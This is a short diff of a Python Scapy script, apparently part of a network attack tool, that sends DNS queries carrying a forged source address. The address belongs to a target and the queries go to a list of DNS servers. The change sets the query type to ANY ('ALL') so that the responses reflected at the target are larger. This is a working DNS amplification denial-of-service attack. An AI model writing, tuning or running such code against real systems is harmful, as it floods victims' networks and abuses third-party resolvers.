@@ -164,7 +164,7 @@ class Jam(object):
 				for server in self.dnsservers:
 					pkt = IP(dst=server, src=self.tgt)/\
 						UDP(dport=53, sport=RandNum(1024,65535))/\
-						DNS(rd=1,qd=DNSQR(qname="www.google.com"))
+						DNS(rd=1,qd=DNSQR(qname="www.google.com",qtype="ALL",qclass="IN"))
 					send(pkt, inter=0.0, verbose=False)
 		except Exception as e:
 			print "[!] Error: {}".format(e)
